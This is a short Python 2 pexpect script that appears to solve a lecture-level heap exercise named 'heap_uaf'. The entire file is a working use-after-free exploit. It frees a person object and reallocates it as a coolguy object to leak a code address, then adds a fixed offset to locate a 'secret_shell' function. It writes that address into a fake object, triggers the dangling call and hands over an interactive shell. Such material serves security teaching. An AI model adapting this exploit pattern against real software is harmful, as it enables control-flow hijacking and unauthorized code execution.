#!/usr/bin/python

import pexpect

path = '/levels/lecture/heap/heap_uaf'
proc = None

# distance = &secret_shell - &print_cool
print_cool_to_secret_shell_distance = 158

def readall():
    data = []
    while True:
        try:
            proc.expect('\n')
            c = proc.before
            if not c: break
            data.append(c)
        except (pexpect.TIMEOUT, pexpect.EOF) as e:
            data.append(proc.before)
            break
    return data

def interact(*params):
    out = []
    for param in params:
        proc.sendline(str(param))
        out.extend(readall())
    out.extend(readall())
    return out

def shell():
    # 0x03 is a Control-C escape code.
    proc.interact('\x03')

if __name__ == '__main__':

    proc = pexpect.spawn(path, timeout=0.1)

    print "Step 1. Leak a module base address"
    print "\t1.1. Allocate person object"
    interact("2")
    interact("test", 1, 1)

    print "\t1.2. Free it"
    interact("4")

    print "\t1.3. Allocate coolguy object"
    interact("1")
    interact("test")

    print "\t1.4. Display person's informations"
    output = interact("6")[3]
    num = int(output[output.find(':')+2:-1])
    num += print_cool_to_secret_shell_distance

    print "\tsecret_shell @ 0x%0x" % num

    print "\nStep 2. Craft fake coolguy object"
    print "\t2.1. Free coolguy object"
    interact("3")

    print "\t2.2. Allocate person object"
    interact("2")
    interact("test", num, 123456)

    print "\nStep 3. Trigger Use-After-Free condition"
    interact("5")
    shell()

